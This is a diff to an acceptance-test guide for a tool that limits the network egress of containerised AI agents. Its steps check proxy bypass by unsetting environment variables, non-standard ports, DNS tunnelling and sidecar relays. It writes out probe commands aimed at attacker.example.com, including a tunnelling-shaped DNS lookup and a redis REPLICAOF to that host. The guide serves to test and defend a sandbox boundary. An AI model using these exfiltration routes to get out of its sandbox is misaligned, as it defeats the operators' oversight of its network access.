@@ -33,13 +33,23 @@ Covers, for this feature:
 
 ---
 
+> **Phase B syntax note, applying to every step below.** T112/FR-018b **removed** the two-key
+> `egress.providers:` / `egress.allow:` syntax — it is a hard refusal naming its replacement, not a
+> deprecation. Steps written against it have been rewritten to the unified `egress.allow:` list; if
+> you find one that was missed, the tool will refuse it and tell you the replacement.
+
 ## Tier 2 — Real container (acceptance)
 
 ### S1 — Identity is unchanged — run this first
 
 ```bash
-agent-container list --json      # before and after, same names
+agent-container list --json                       # container names + ports
+<runtime> volume ls | grep agent-container-dev    # the nine volume names
 ```
+
+`list --json` emits `containers` only — it has never reported volumes, so the volume half needs the
+runtime (or `bin/tests/test_pure_logic.py`'s `VOLUME_SUFFIXES`, which pins the same nine names
+hermetically and is what the gate actually checks).
 
 **Expected**: container name, port and all **nine** volume names identical. A tenth volume means
 FR-010 was implemented in place rather than deferred (research R9) — **stop**, that is a migration,
@@ -50,7 +60,8 @@ not this feature.
 ```yaml
 # .agent-container/environments.yaml
 egress:
-  providers: [anthropic]
+  allow:
+    - provider: anthropic
 ```
 
 ```bash
@@ -87,18 +98,21 @@ failure C3 forbids.
 
 ```yaml
 egress:
-  providers:
-    - name: anthropic
-      hosts: [llm.corp.internal]
+  allow:
+    - { provider: anthropic, hosts: [llm.corp.internal] }
 ```
 
 ```bash
 agent-container up dev
-agent-container status dev --json | jq '.egress.hosts, .egress.host_source'
+# `status` takes NO environment name (see S7) — it reports every declared environment
+# and the caller filters, so a bare `status dev` is rejected as an extra argument.
+agent-container status --json | jq '.data.environments[] | select(.name=="dev") | .egress.destinations'
 ```
 
-**Expected**: the allowlist contains `llm.corp.internal` and **not** `api.anthropic.com`;
-`host_source` reads `declaration`. Then, inside the container:
+**Expected**: the allowlist contains `llm.corp.internal` and **not** `api.anthropic.com`; that
+entry's `source` reads `declaration`. (T112 replaced the flat `egress.hosts`/`host_source` pair
+this step used to read — `jq '.egress.hosts'` now prints `null`, which is a verification step
+passing while verifying nothing.) Then, inside the container:
 
 ```bash
 curl -s -o /dev/null --max-time 20 https://api.anthropic.com/v1/messages; echo "exit=$?"
@@ -132,7 +146,7 @@ to ignore it.
 
 ```yaml
 egress:
-  providers: []
+  allow: []
 ```
 
 **Expected**: deploys; every outbound model call is refused. The container still runs, the shell
@@ -170,37 +184,55 @@ agent-container status --json | jq '.data.environments[] | select(.name=="dev")'
 filters. That is more useful than one row, and it kept the CLI from growing an argument merely to
 match this document.
 
-**Expected**: `egress.enforcement`, `egress.enforced`, `egress.hosts` (the **effective** allowlist,
-each entry tagged `tool` or `declaration`), `honours_proxy`, and `builtin_default_provider`.
+**Expected**: `egress.enforcement`, `egress.enforced`, `egress.destinations` (the **effective**
+allowlist, each entry tagged `source: tool | declaration` and `port`), `honours_proxy`, and
+`builtin_default_provider`.
 
 Check the two pairs that must not be conflated:
 
-| Field | Undeclared | `providers: []` |
+| Field | Undeclared | `allow: []` |
 |---|---|---|
 | `declared` | `false` | `true` |
 | `unrestricted` | **`true`** | **`false`** |
 
-Both have an empty `hosts` list and they are **opposites** — a caller must never have to infer
-which from emptiness.
+Both have an empty `destinations` list and they are **opposites** — a caller must never have to
+infer which from emptiness.
 
 `declared` and `enforced` are likewise distinct: an advisory declaration that cannot be enforced
-reads `declared: true, enforced: false` with a `not_enforced_reason`. Then read the prose output
-and confirm it says a proxy binds clients that honour it, does **not** stop a process that dials
-directly, and that a shell can override it via `~/.agent-env/env` (FR-008a). Any phrasing implying
-more than that fails SC-004.
+reads `declared: true, enforced: false` with a `not_enforced_reason`.
+
+Then read the prose output — **and expect the PACKET-LEVEL statement, not the proxy one.** The
+statement is mode-aware since T140: on a deployment that got the boundary it says enforcement is
+packet-level and does not depend on the agent's cooperation, and names its residual limits (not
+content inspection; TLS never terminated so traffic to a declared host is unseen; the connection is
+spliced to the address the *client* chose, so a declared name does not constrain the address; and
+`egress.sidecars_outside` is outside entirely). The older text below — a proxy binding only clients
+that honour it, overridable from `~/.agent-env/env` (FR-008a) — is the **fallback** statement, and
+seeing it on a Phase B deployment means enforcement is not what you think it is. Either way, any
+phrasing implying an absolute guarantee fails SC-004.
 
 ### S8 — Strict mode refuses what advisory permits (FR-007b, SC-004a)
 
-Point the environment at an agent not on the adherence list (or stop the proxy image from
-starting):
+**Do not use "an agent not on the adherence list" — that stopped being an obstacle in Phase B.**
+Transparent enforcement needs nothing *from the agent*, so an unprobed agent still gets the
+boundary (`egress_enforcement_mode({"allow": []}, "some-future-agent")` → `transparent`). The two
+obstacles that remain are the ones the tool can actually see: **the egress image sources are not
+reachable** (no `image/egress/Dockerfile` in a checkout — run from a non-editable PyPI install), or
+an **operator override redefining the `egress` service** in `dev.services.yaml`. Use one of those:
 
 ```bash
 agent-container up dev            # enforcement: advisory
 agent-container up dev            # enforcement: strict
 ```
 
-**Expected**: advisory deploys and says the declaration is not enforced; strict **refuses**, naming
-the agent and why. Zero deployments proceeding with an unenforceable declaration.
+**Expected**: advisory deploys and states the **specific** obstacle — never "unsupported", since
+the whole point of FR-021 is that the operator can tell which enforcement they obtained — while
+strict **refuses**. Zero deployments proceeding with an unenforceable declaration.
+
+There is no third, weaker "deployed but cooperative" outcome to look for: every obstacle above rules
+out the proxy just as completely as the boundary, so the modes are `transparent` and `none` (spec
+FR-021a). Whether the daemon will grant `NET_ADMIN` is not knowable before running the container, and
+that case **fails closed** in the entrypoint rather than being guessed at here.
 
 ### S9 — The proxy dies with the environment (FR-007)
 
@@ -222,7 +254,7 @@ With an environment declaring **both** providers and credentials, seed a sentine
 export ANTHROPIC_API_KEY='sk-ant-SENTINEL-do-not-appear'
 agent-container up dev
 grep -r 'SENTINEL' "$XDG_STATE_HOME/agent-container/"     # expect: no hits
-agent-container status dev --json | grep SENTINEL          # expect: no hits
+agent-container status --json | grep SENTINEL              # expect: no hits (takes no name, see S7)
 ```
 
 **Expected**: no hits anywhere — the generated compose model, the proxy's generated config, and
@@ -295,7 +327,9 @@ unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy
 curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models; echo "exit=$?"
 ```
 
-**Expected**: **non-zero**. Under Phase A this returns **0** — that difference *is* the feature.
+**Expected**: **non-zero** — measured **exit 6**, "could not resolve host", because with the
+variables gone the name goes to the sidecar resolver, which refuses it. Under Phase A this returns
+**0**; that difference *is* the feature.
 
 ```bash
 echo 'export HTTPS_PROXY=' >> ~/.agent-env/env    # survives teardown, sourced by every shell
@@ -305,18 +339,53 @@ bash -lc 'curl -s -o /dev/null --max-time 15 https://api.openai.com/v1/models'; 
 **Expected**: **still non-zero.** This is the hole FR-008a had to *disclose* under Phase A and
 Phase B actually closes.
 
-## S13 — A non-standard port is not a way around it (SC-009)
+**Then run the positive case in the same shell, and do not skip it:**
 
 ```bash
-curl -s -o /dev/null --max-time 15 http://example.com:8080/; echo "8080=$?"
-curl -s -o /dev/null --max-time 15 http://example.com:1337/; echo "1337=$?"
+curl -s -o /dev/null --max-time 15 https://api.anthropic.com/v1/messages; echo "declared=$?"
+```
+
+**Expected**: **0** — meaning `curl` verified the chain against public CAs, which is also the
+Constitution III check: a spliced connection presents the *real* server certificate, and a
+locally-issued CN would mean squid has silently become `bump`. **A boundary that refuses everything
+passes every refusal step above while being completely broken**, and broken-closed is the failure
+this mechanism makes easy (T136a, R19c).
+
+## S13 — A non-standard port is not a way around it (SC-009)
+
+**Read the assertion note before running this — a naive `$?` check reads as a PASS on the wrong
+grounds and as a FAIL on the right ones.** `curl` exits **0 for a `403`**, and with the diagnostic
+proxy variables set (they are, by default) an undeclared port is now *refused with a status* by
+squid rather than dropped — the improvement R1a asked for. So run **both** probes:
+
+```bash
+# 1. with the proxy variables set — expect a 403 FROM SQUID, and curl exit 0
+curl -s -o /dev/null -w 'http=%{http_code}\n' --max-time 15 http://example.com:8080/
+echo "8080-proxied exit=$?"
+curl -s -o /dev/null -w 'http=%{http_code}\n' --max-time 15 http://example.com:1337/
+echo "1337-proxied exit=$?"
+
+# 2. the one that tests NETFILTER rather than the agent's cooperation
+env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy \
+  curl -s -o /dev/null --max-time 15 http://example.com:8080/; echo "8080-direct=$?"
+env -u HTTPS_PROXY -u HTTP_PROXY -u https_proxy -u http_proxy \
+  curl -s -o /dev/null --max-time 15 http://example.com:1337/; echo "1337-direct=$?"
+
 ssh -o ConnectTimeout=10 git@github.com; echo "ssh=$?"
 ```
 
-**Expected**: all fail. **This is the scenario the first design sketch got wrong** — redirecting
-only 80/443 with a default-accept policy lets `8080` sail straight through, which is *worse than no
-control* because the declaration reads as constraining while the agent reaches anything it likes on
-an unusual port.
+**Expected**: probe 1 reports `http=403` (a refusal, named); probe 2 is **non-zero** (measured:
+exit 6 — the name is not declared, so it does not even resolve). **A 2xx or 3xx from probe 1 is the
+failure**, and so is `0` from probe 2.
+
+**This is the scenario the first design sketch got wrong** — redirecting only 80/443 with a
+default-accept policy lets `8080` sail straight through, which is *worse than no control* because
+the declaration reads as constraining while the agent reaches anything it likes on an unusual port.
+
+> The corresponding acceptance test asserted `returncode != 0` and **failed while the port was
+> properly closed** (research R21, T129e). Do not "fix" it by inverting to `returncode == 0`: that
+> also passes when the agent genuinely *reaches* the port, which is the whole hole SC-009 exists to
+> catch.
 
 ## S14 — A declared non-HTTP destination works, and only it (SC-010)
 
@@ -328,8 +397,21 @@ egress:
       port: 22
 ```
 
-**Expected**: `ssh -T git@github.com` succeeds; `ssh git@gitlab.com` fails; `github.com` on any
-*other* port fails. That host and that port — not the protocol generally.
+```bash
+ssh -T -o ConnectTimeout=10 git@github.com;        echo "declared=$?"
+ssh -T -o ConnectTimeout=10 git@gitlab.com;        echo "other-host=$?"
+ssh -T -o ConnectTimeout=10 -p 443 git@github.com; echo "other-port=$?"
+```
+
+**Expected**: the declared pair succeeds (`ssh -T git@github.com` prints GitHub's greeting and exits
+1 — that is a *successful* connection, so read the message, not the code); the other host fails to
+**resolve** (undeclared names are REFUSED by the sidecar resolver); the other port **times out**,
+because `github.com` resolves — a ported entry is in the DNS allowlist too — but nothing permits
+443 to it. That host and that port, not the protocol generally.
+
+> **Caution while T147 is open**: `iptables -d github.com` resolves and *pins* the addresses at
+> rule-install time. If this step fails for the declared pair after a previously-working deploy,
+> suspect a rotated address before suspecting the declaration.
 
 ## S15 — DNS cannot be used to tunnel out (SC-012, SC-013)
 
@@ -337,12 +419,25 @@ egress:
 getent hosts api.anthropic.com          # declared  -> resolves
 getent hosts api.openai.com             # undeclared -> does not
 getent hosts ZXhmaWx0cmF0ZWQ.attacker.example.com   # tunnelling-shaped -> does not
-dig @8.8.8.8 attacker.example.com       # forced to the sidecar resolver, not Google
+dig +time=5 +tries=1 @8.8.8.8 attacker.example.com  # cannot be asked at all
+agent-container logs dev --egress | grep -i refused  # the refusals are a RECORD
 ```
 
-**Expected**: only the declared name resolves, and the direct-to-Google query is redirected. A
-forwarding-but-faithful resolver would pass the first three and fail the point — **the exfiltration
-is in the question, not the answer.**
+**Expected**: only the declared name resolves. **`dig @8.8.8.8` does not return Google's answer and
+is not silently answered by ours either — it fails to connect** ("no servers could be reached").
+That is the design, not a defect: FR-020a is met by **dropping** port 53 rather than redirecting it
+(research R18, measured). A REDIRECT would *answer* an agent that asked Google, substituting our
+resolver behind its back; the DROP means every resolver except ours is **unreachable**, so it cannot
+ask. Any earlier wording here that said the query is "redirected" described a design that was tried
+four ways and abandoned.
+
+The last line is T130's half of the same requirement: a refused lookup must leave a **record**.
+`REFUSED` means the name is not declared; `NXDOMAIN` means it genuinely does not exist — and an
+`NXDOMAIN` for an undeclared name is the tell that the DNS rules landed in the wrong position rather
+than that the policy is off.
+
+A forwarding-but-faithful resolver would pass the first three and fail the point — **the
+exfiltration is in the question, not the answer.**
 
 ## S16 — The agent gained no privilege (SC-011)
 
@@ -365,12 +460,23 @@ services:
 ```
 
 ```bash
-redis-cli -h redis REPLICAOF attacker.example.com 6379
+# 127.0.0.1, NOT `-h redis`. Placing the sidecar inside the boundary means it SHARES
+# this network namespace, so service-name DNS no longer resolves between the two and
+# `-h redis` fails on the lookup — which would look like the test passing for the
+# wrong reason. The sidecar is simply on loopback now. (T149 is open on making the
+# tool say this rather than leaving the operator to discover it.)
+redis-cli -h 127.0.0.1 REPLICAOF attacker.example.com 6379
+sleep 2
+redis-cli -h 127.0.0.1 INFO replication | grep -E 'master_link_status|master_host'
 ```
 
-**Expected**: refused. The agent needn't escape the namespace — it need only ask something that
-already has the access. A design that locks the agent down and leaves sidecars outside produces an
-environment reporting `enforced: true` while two lines of redis walk out.
+**Expected**: refused — `master_link_status:down`, never `up`. Assert on the **replication state**,
+not on the `REPLICAOF` command's own reply: redis answers `OK` immediately and connects
+asynchronously, so the `OK` says nothing about whether the connection was permitted.
+
+The agent needn't escape the namespace — it need only ask something that already has the access. A
+design that locks the agent down and leaves sidecars outside produces an environment reporting
+`enforced: true` while two lines of redis walk out.
 
 ## S18 — `git push` still works, or the feature is unshippable
 
@@ -380,7 +486,9 @@ git push        # over SSH, with port 22 declared per S14
 
 **Expected**: succeeds. **Default-deny kills `git push` unless SSH is declared**, which is Hard
 Constraint #1 breaking from the opposite direction to Phase A's HTTPS case. If this fails, the
-deploy-time check (FR-003c's SSH arm) did not fire and should have.
+deploy-time check (FR-003c's SSH arm) did not fire and should have — and note that arm fires **only
+under transparent enforcement**: under the Phase A proxy `ssh` ignores `https_proxy` and the push
+genuinely works, so a warning there would train operators to ignore the check.
 
 ## S19 — An undeclared environment is untouched (FR-004)
 
